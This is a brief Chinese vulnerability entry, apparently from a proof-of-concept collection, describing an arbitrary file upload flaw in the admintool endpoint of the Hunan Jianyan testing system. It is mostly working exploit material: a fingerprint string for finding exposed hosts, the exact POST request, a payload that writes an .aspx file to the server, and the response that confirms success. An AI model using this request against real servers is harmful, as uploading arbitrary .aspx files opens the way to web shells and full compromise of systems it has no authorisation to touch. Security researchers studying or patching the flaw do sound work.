# 湖南建研检测系统admintool任意文件上传漏洞

湖南建研检测系统admintool ｜ 文件上传 ｜ —
- **指纹**：`body="/Content/Theme/Standard/webSite/login.css"`
- **请求**：`POST /Scripts/admintool?type=updatefile HTTP/1.1`

**Payload**
```
filePath=dudesuite.aspx&fileContent=dudesuite
```
- **响应特征**：200 dudesuite.aspx